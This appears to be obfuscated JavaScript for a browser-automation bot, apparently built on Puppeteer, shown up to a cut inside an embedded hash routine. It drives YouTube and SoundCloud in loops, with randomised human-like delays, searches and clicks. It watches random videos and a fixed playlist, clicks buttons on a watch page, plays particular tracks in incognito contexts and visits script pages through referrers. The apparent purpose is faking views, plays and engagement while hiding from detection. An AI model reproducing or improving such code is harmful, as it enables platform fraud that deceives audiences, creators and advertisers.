const a0 = c,
  Z = b,
  Y = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1928 + 0x60d + 0x4c7 * 0x4))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * -0x94d + -0x24e7 + 0x1b9a), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xdb10 + 0x35a9 * 0x1 + 0x9b89 * -0x1 + (0x33f7 + -0x3069 + -0x2 * -0x1b85) * random()) : await standardWaitForNetIdle(f), await wait(0x1 * 0x201d + -0xe9 * 0x8 + -0x54d + (0x10 * -0x44a + 0x5d * -0xcb + 0x1 * 0xb56f) * random()), -0x1fac + -0x4e8 + 0x2495;
}

function a() {
  const bm = [
    'w9F2NST-9j',
    'CMCVzw4VC2nYAq',
    'r0vu',
    'prototype',
    'hex',
    'Bwf4lwfNzt0Wla',
    'cripts/by-',
    'close',
    'zs8Q',
    'pts/454134',
    'lmkaWPrIrwCkWPBcRCk4',
    'WRb4W5vLfumXtCknW5C',
    'dCoBjmoWj8kaWOFcObDM',
    'Ahr0Chm6lY9NCG',
    'C3bSAxq',
    'https://so',
    'iWzezFWpU7',
    'Ctq2vZHnvfjuqW',
    'UtPRpKRTtH',
    'z2v0rwXLBwvUDa',
    'yNjLywTPBMCTAq',
    'restrictio',
    'WPqwWRqyk8kVxmoCpSoH',
    'm0S5suXLD25vAW',
    'y2fTCgfPz249CW',
    'nsddTXO9wgNcMhhcSW',
    'WONdL8kNWPVdH8keW6CBW6mo',
    'mdq0lxPOAwH1lq',
    'Bw91C2vWBhvZ',
    'WPfoW75lqahdGa',
    'WQdcItpdISoZW7TTW5KHbW',
    'https://ww',
    'zgL1Bs5JB20Vqa'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1ef7 + -0xd * -0x5f + 0x2dac), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x13e8 + -0x2453 + 0x7a * 0x76;
}
async function randomWait() {
  return await wait(-0x10 * 0x125 + -0x1d01 + 0x42d9 + (0x248c * 0x1 + -0x187c + 0x8 * 0xef) * random()), 0x608 + 0x1a62 + -0x1 * 0x2069;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x15e4 * -0x1 + -0xb2 * -0x13 + -0x1 * -0x8ae, 0x49 * 0x31 + -0x1d0 * -0x8 + -0x1c72), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x205 * -0x9c + 0x1167e + -0x10eee * -0x1) * getRandomInt(-0x640 + 0x679 * -0x4 + 0x5 * 0x66e, -0xce4 + 0x10b9 + -0x3d0), h)), 0x7 * -0x3d3 + -0x291 * -0x1 + 0x1835;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = c,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document[R(0x13) + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x22f4 + -0x7c * 0x17 + -0x6 * 0x3f8;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x600 + 0x2e * 0xcd + -0xff * 0x2b]['split']('\x20');
    for (let k = 0xa4 * -0x3a + 0x1ac6 + 0xa62; k < i['length']; k += 0x1 * 0x1b3b + 0x8 * 0x470 + 0x1 * -0x3eb9)
      j += i[k] * h[i[k + (-0xa9c + 0x11de + -0x741)]];
    return j;
  });
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x7d6 * 0x1 + -0x1 * 0x1000 + 0x82a);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * -0x1521 + 0x116 * -0x9 + -0xb55)['map'](l => Array['from'](l['children']))['flat'](-0xb9f + 0x1779 + -0xbd9)['map'](l => l['childNodes'][-0xcda + 0x239 * 0x6 + -0x7b]['childNodes'][-0x3c2 + 0x2 * 0xa56 + -0x10ea]['childNodes'][-0x2116 + 0x1d33 + 0x3e4]['childNodes'][0x5 * -0x5a7 + -0x3 * -0x72 + 0x1aed]['childNodes'][-0x1 * -0xf35 + 0x2 * 0xa97 + 0x1 * -0x2462]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1bca + -0x104f + -0x793, -0x9db + 0x1b28 + -0x1 * -0x23b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x4eae + -0x44d + 0x8d93 * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x1 * 0x12191 + 0x2b * -0x595 + 0xb8d6) * getRandomInt(0x1d2d + -0x1638 + 0x6f3 * -0x1, 0x14b1 + -0x2 * 0x1162 + 0xe18), h);
  return await wait(i), 0x13b5 + 0x29c + 0x8 * -0x2ca;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * -0x8dd + -0xf0a + 0x17e7]['children'][0x2451 + 0x14dd + -0x233 * 0x1a]['children'][0x4eb * -0x1 + 0x199 * -0x5 + 0xce8]['children'][-0x1 * 0x50 + 0x2250 + -0x2200]['children'][0x1e50 + -0x20dd + 0x28d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xe7a + -0x18f7 + 0x1 * 0xa7e;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x9d2 + -0x128e * -0x1 + -0x2 * 0x42c + (-0x114f + -0x1 * 0x16c3 + 0x2844) * random()
  }), await wait(0x1d31 + -0xb * 0x2e + -0x1 * 0x1943 + (-0x2 * -0xbc4 + 0xff3 + -0x264f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x201d * -0x1 + 0x1 * -0x1495 + 0x24e * -0x5]['childNodes'][-0x21d1 + 0xf6 + 0x1 * 0x20dc]['childNodes'][0x207 * 0x11 + 0x11d2 + -0x4 * 0xd12]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x114 * 0x14 + 0x1019 * -0x2 + 0x35c7 * 0x1]['childNodes'][-0x1157 * 0x1 + 0x1836 + 0x6df * -0x1]['childNodes'][0x34b + 0x1192 + -0x14db * 0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1fa + 0x98b * 0x3 + -0x2 * 0xf4d),
          r = 0xa16 + 0x7 * -0x2ba + -0x48 * -0x20;
        for (let u = -0x2 * 0xb2a + -0x1499 + 0x2aed; u < q['length']; u += -0x1 * 0x1cf3 + 0x13a * -0xe + 0x2e21)
          r += q[u] * k[q[u + (0x21a7 + -0x2066 + -0x140)]];
        return r;
      }(n);
  });
  await wait((-0x3 * 0x1b59 + 0x40e4 + 0x4bbf) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xaec * 0xc + 0x10fdc + 0x5d94) * getRandomInt(0x472 + 0x125 * -0xa + 0xb * 0xa3, -0x11f1 + -0x1 * -0x52f + 0x1d4 * 0x7), h + (-0x834 + -0x1da1 + 0x10b * 0x37));
  return await wait(i), -0x1 * -0x2645 + -0x1fc7 + -0x67d;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x60d + -0x1b71 * 0x1 + 0x1564), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x4 * -0x7f1 + -0x2b * -0x42 + 0x31d * -0xa + (0xd90 * 0x2 + -0x1e2 * -0xb + -0x2bee * 0x1) * Math['random']());
    });
  }, -0x2383 + -0x2a2 * 0xe + 0x43 * 0x17d);
  await wait(0xc91f + -0x369e4 + 0x1 * 0x734a5);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1d41e + -0x12d3c + 0x437e) * getRandomInt(0x19d * 0x5 + 0xc9 * 0xd + -0x1242, 0xfb6 + 0x2 * -0x7ce + 0x1 * -0x1)), clearInterval(h), -0x57a * -0x1 + -0xf0c + 0x993;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x15e4 + -0x1689 + 0x21 * 0x5;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0xbce + -0x1618 * 0x1 + 0xa4b;
    await randomWait();
  }
  return -0x37e * 0x6 + -0x2536 + -0x3a2b * -0x1;
}

function fetchRandomSC() {
  const T = d,
    S = c;
  return Math['random']() <= -0x11b2 + -0x2302 + 0x34b4 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x73d * -0x1 + 0x1b97 + -0x22d4 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + S(0x18) + 'ocial_shar' + 'ing' : T(0xf) + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x7d6 * 0x1 + -0x1 * 0x1000 + 0x82a);
    let h = e[f];
    if (c['Cemwib'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xe7d + -0x2 * 0x114 + 0x10a5, r, s, t = -0x5 * -0x442 + -0x239 * 0xb + -0x1 * -0x329; s = m['charAt'](t++); ~s && (r = q % (0x7 * -0x87 + 0xb22 + -0x1 * 0x76d) ? r * (0xf * -0x21b + -0xd51 + 0x2d26 * 0x1) + s : s, q++ % (-0xa * -0x31 + 0x216b + -0x2351)) ? o += String['fromCharCode'](-0x1 * -0x1c53 + 0x5 * -0x17d + -0x6a1 * 0x3 & r >> (-(-0x13f1 + 0x9 * -0x3d0 + 0x1d * 0x1df) * q & 0x1903 + 0x480 + -0x1d7d)) : -0x2066 + -0x195 * 0x12 + -0x8 * -0x79c) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1e6f + -0x13e8 + 0x3257, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x13f1 + 0x1416 + -0xd * 0x313))['slice'](-(-0x221 * 0xb + 0x7b5 * -0x1 + 0x1f22));
        }
        return decodeURIComponent(p);
      };
      c['sSeMjy'] = i, b = arguments, c['Cemwib'] = !![];
    }
    const j = e[0x160 * 0x16 + 0x1373 + -0x31b3],
      k = f + j,
      l = b[k];
    return !l ? (h = c['sSeMjy'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    const X = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x695 * 0x3 + -0x2231 + 0x56 * 0x2b + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1580 + 0xca5 + 0x1 * 0x8db;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const U = b;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + U(0xc, 'fl6x') + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2e90 + 0x11ac7 + -0x998f * 0x1 + getRandomInt(0x7068 + 0x1e39 + -0x5409, 0x8f4a + -0x71 * -0x142 + 0xa83c * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x4d0 + 0x1 * -0x2551 + 0x2a22), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x33d * -0x1 + -0x1ee3 + 0x20 * 0x111;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xa53 + -0x1bfd + -0x994 * -0x4, -0xa0 * 0x25 + 0x1 * 0x215e + -0x4 * 0x283)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x15bf * 0x1 + -0x24 * 0x88 + 0x67 * 0x79 + floor((0x108d + 0x989 + -0xb17 * 0x2) * random()))), log('p2'), log(await s['evaluate'](() => {
        const W = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x218409fc + -0x26ffd482 + 0x857bca86),
          -0x9667 * 0xd8 + 0xb6 * -0xd094 + 0x1d0f * 0xde0,
          -0x3 * -0x4282 + 0xa26d + -0xe9f3,
          -0xba * -0x1d + -0x2232 * 0x1 + 0xda0
        ], y = [
          0x18dd + -0x2343 + -0xa7e * -0x1,
          0x31 * 0x35 + 0x16ce + 0x1 * -0x20e3,
          -0x13cb + 0x141 * -0x12 + 0x2a65,
          -0x13c9 + -0xa * -0x3b7 + 0x379 * -0x5
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xd29 * 0x2 + -0x799 * 0x5 + -0x3 * -0x3e4)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * -0x4df + 0x1340 + 0xe61 * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const V = d;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest'](V(0x4));
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x30b * -0x1 + -0xe78 + -0x1 * -0x1183) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest'](V(0x4));
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1ec2 + -0x3 * 0xc4c + 0x622 * 0x1] = A[0x2062 + -0x1 * 0x13de + -0xc74] = A[0xd9a * 0x1 + 0x421 + -0x11ba] = A[0x1 * 0x1999 + -0xd84 + 0xb * -0x119] = A[-0x14ae + 0xfe * -0x2 + 0xf * 0x183] = A[0x28e + -0x24a + -0x40] = A[0xbe9 * 0x1 + 0x6a7 + 0x1 * -0x128b] = A[-0x1 * 0x2283 + -0x1190 + 0x3419 * 0x1] = A[-0x2378 + -0x4 * 0x7e1 + 0x4303] = A[-0x1e0e + 0x227d * -0x1 + 0x4093 * 0x1] = A[0x15ae + -0x1 * -0x215e + 0x3703 * -0x1] = A[0xc18 + 0x4 * 0x2ea + 0x2 * -0xbdb] = A[-0x146 + -0x24 * -0x20 + -0xa3 * 0x5] = A[-0x6bb * 0x1 + 0x14b4 + -0xded] = A[0x1 * 0x7f6 + -0x1c55 + 0xa36 * 0x2] = A[-0x2075 + -0x3 * -0x955 + 0x484] = A[0x414 + -0x1a * 0x53 + 0x469] = 0x14bc + 0x126 * 0xf + 0x2 * -0x12fb, this['blocks'] = A) : this['blocks'] = [
                -0x13 * -0x71 + -0xc7a + -0x417 * -0x1,
                -0x101d + 0x1 * -0xaa4 + -0x3 * -0x8eb,
                -0x47 * -0x84 + 0x1 * -0x2039 + -0x463,
                0xd83 + -0x31 * -0x6e + -0x1 * 0x2291,
                0x9ed + 0x56 * 0x36 + -0x1c11,
                0x1 * 0x12fd + 0x14bd * 0x1 + -0x27ba,
                0x11 * -0x182 + 0x17 * 0x14b + -0x41b,
                0x70 + 0x178a + -0x9 * 0x2aa,
                0x4a4 + -0x2f9 * 0xd + 0x6cd * 0x5,
                0x1 * -0x111b + 0x419 * -0x7 + -0x1 * -0x2dca,
                -0xc * 0x301 + 0x19ef + -0x35f * -0x3,
                0x790 + 0x13c8 + 0xe * -0x1f4,
                -0x1 * -0x45f + 0xa1d * 0x1 + -0xe7c,
                0x9d6 * -0x2 + 0x2f5 + -0x10b7 * -0x1,
                -0x223e + 0x26b4 + -0x1 * 0x476,
                -0x15f * 0x17 + -0x1 * -0x479 + -0x6c4 * -0x4,
                0x5e * -0x2f + -0x1d80 + 0x2ec2
              ], this['h0'] = -0xe * 0xe497385 + 0x1 * -0x95266213 + 0x1c46fd65a, this['h1'] = -0x1c9c54d * -0x6b + 0x1022a4534 + -0xc4a33a * 0x111, this['h2'] = -0xe7c5c148 + 0x30ad7f08 + 0x347412 * 0x667, this['h3'] = 0x5 * -0x4cd5627 + -0x204a652d + 0x487f6866, this['h4'] = 0x5e51 * 0x3673d + 0x9b33693 * -0x19 + 0x755725fe, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1e7d * -0x1 + 0x4be * 0x2 + 0x1 * 0x1501, this['finalized'] = this['hashed'] = 0xf54 + 0x1451 + -0x23a5, this['first'] = 0x1 * -0x1cc4 + 0x1599 + 0x72c;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x3a * -0x2e + -0x2d * 0x98 + 0x1c * 0x95, O = J['length'] || 0x1138 + -0x143f + -0x5 * -0x9b, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x7 * 0x125 + -0xe51 + 0x64e, P[0x2 * 0x8fb + 0x3c1 * -0x2 + -0xa74 * 0x1] = this['block'], P[-0x53 * 0x65 + -0x2 * 0x1097 + 0x41fd] = P[-0x717 * -0x1 + -0x12f1 + 0xbdb] = P[-0x23 + -0x5b * -0xf + -0x530] = P[-0x1f44 * 0x1 + -0x10f8 + 0x303f] = P[0xce2 * -0x2 + -0xf5e * -0x1 + 0xa6a] = P[0x24a8 + -0xe29 + -0x7 * 0x336] = P[-0x1 * 0xaf2 + -0x1786 + 0x1 * 0x227e] = P[-0x2154 + 0x4f5 * -0x4 + -0x1 * -0x352f] = P[-0x1 * 0x4cd + -0x1d * 0xc5 + 0x1b26 * 0x1] = P[0x1a89 * 0x1 + 0xd * 0xbd + -0x1 * 0x2419] = P[-0x4 * -0x34 + 0xfdd + 0x10a3 * -0x1] = P[0x1b86 + -0x16b * 0xb + -0xbe2] = P[-0x191f + 0xfd8 + -0x953 * -0x1] = P[-0x11d7 * 0x2 + -0x1f45 + 0x4300] = P[-0x21db + -0x7 * 0x3dc + 0x6c5 * 0x9] = P[-0x37 * -0xa + -0x377 * 0x7 + 0x162a] = 0xda6 + 0x250c + -0x73e * 0x7), K) {
                    for (N = this['start']; M < O && N < 0xb47 * -0x1 + -0x2 * 0xa49 + 0x2019; ++M)
                      P[N >> 0x5 * -0x1c5 + -0xb51 + 0x2 * 0xa16] |= J[M] << y[-0x1442 + -0x533 * -0x6 + 0x1 * -0xaed & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x19a2 * 0x1 + 0x1ecf + -0x4ed; ++M)
                      (L = J['charCodeAt'](M)) < 0xf2c + -0x277 + 0x19 * -0x7d ? P[N >> 0x2668 * 0x1 + 0x94 * -0x3a + -0x4de] |= L << y[-0xf * 0xa5 + 0x1e * -0x95 + -0x1b24 * -0x1 & N++] : L < 0x24eb + -0x1a8e + -0x25d ? (P[N >> -0x1d * 0x5d + 0x26 * -0x8e + 0x653 * 0x5] |= (0xb2e + 0x1b71 + -0x793 * 0x5 | L >> 0x154 + 0x1fda + -0x2128) << y[0x95c + -0xa6 + 0x83 * -0x11 & N++], P[N >> -0x446 + -0xb87 * -0x2 + -0x12c6] |= (0x663 + 0xdd1 + -0x13b4 | -0x5 * -0x13 + -0x41b + 0x1 * 0x3fb & L) << y[-0x12db + -0xd21 * 0x2 + -0x2 * -0x1690 & N++]) : L < 0x91 * 0x207 + -0x180af + 0x132b8 || L >= -0x14 * -0xd81 + -0x7 * 0x4cf + -0xb * 0x121 ? (P[N >> 0xbe8 + 0x254d + -0x3133] |= (-0xfc1 + -0x1d2 + 0x1273 | L >> 0x1 * 0x198f + -0x192 * 0x10 + -0x63) << y[0x2194 + -0x2511 + -0x20 * -0x1c & N++], P[N >> -0x2 * 0x22d + -0x131f + 0x177b] |= (-0x1826 + -0x1ba + 0x1a60 | L >> 0x165b + 0x291 + -0xc73 * 0x2 & -0x211 + 0x1343 + -0x10f3) << y[0x3 * 0x152 + -0xd51 + 0x16 * 0x6d & N++], P[N >> 0x2124 + 0x124d + -0x336f] |= (-0x1e4e + 0xa3 * -0x3b + 0x445f | 0x1305 + -0x186f + 0x5a9 & L) << y[-0x351 + -0x1508 + 0x1 * 0x185c & N++]) : (L = 0x12049 + -0x1ac0b + -0xb3 * -0x236 + ((-0x5cf + 0xaa9 * -0x2 + 0x1f20 & L) << 0x1 * -0x2365 + 0x21c6 + 0x1a9 | -0x1f * 0x10f + 0x168e + 0xe42 & J['charCodeAt'](++M)), P[N >> 0x1daa + -0x1 * 0x1838 + -0x570] |= (0x1750 + 0x2627 * 0x1 + -0x3c87 | L >> -0x116 * 0x1 + -0x1930 + 0x1a58) << y[0x52e + 0x4 * 0x57d + -0x1b1f & N++], P[N >> -0x1a7b * 0x1 + -0x1 * -0x1013 + 0x3e * 0x2b] |= (-0x4bf + 0x74 * -0xe + -0x2b * -0x45 | L >> 0xf * 0x68 + -0x49c + -0x170 & 0x1707 + 0xd62 + -0x242a) << y[0xc5c * 0x3 + 0xa * -0x6f + -0x20bb & N++], P[N >> -0x32 * 0x1c + 0x5 * -0xca + 0x4 * 0x25b] |= (-0x1920 + -0x1528 + 0x2ec8 | L >> -0x1ba9 + 0x11ad * 0x2 + -0x7ab & 0x15f + 0x1 * -0x1d98 + 0x1c78) << y[-0xc41 * -0x1 + -0x415 + -0x829 & N++], P[N >> 0x1af9 + -0x5 * -0x11b + -0x2 * 0x103f] |= (-0x1aae + 0x19 * 0xab + -0xa7b * -0x1 | -0x1cbe + 0x62e + 0x1 * 0x16cf & L) << y[0x1e94 + 0x3a7 + 0xc * -0x2da & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x12 * -0x191 + -0x1ced + 0x395f ? (this['block'] = P[-0x17f0 * 0x1 + -0x34 * -0x8d + 0x129 * -0x4], this['start'] = N - (-0x955 * 0x1 + 0x1c91 * -0x1 + 0x1313 * 0x2), this['hash'](), this['hashed'] = -0x4c0 * 0x4 + 0x993 + 0x96e) : this['start'] = N;
                }
                return this['bytes'] > 0x1 * -0x1845eae6f + 0x7441 * 0x207df + 0x19849a2cf && (this['hBytes'] += this['bytes'] / (-0x1922f7034 + 0xf0dc0e8c + 0x1a15361a8) << 0xba1 + 0xc6b + -0x1b * 0xe4, this['bytes'] = this['bytes'] % (-0x27 * 0x51aae0c + 0x7eb97de8 * 0x1 + 0x1485705ec)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x12b4 + -0x6f5 + 0x522 * 0x5;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
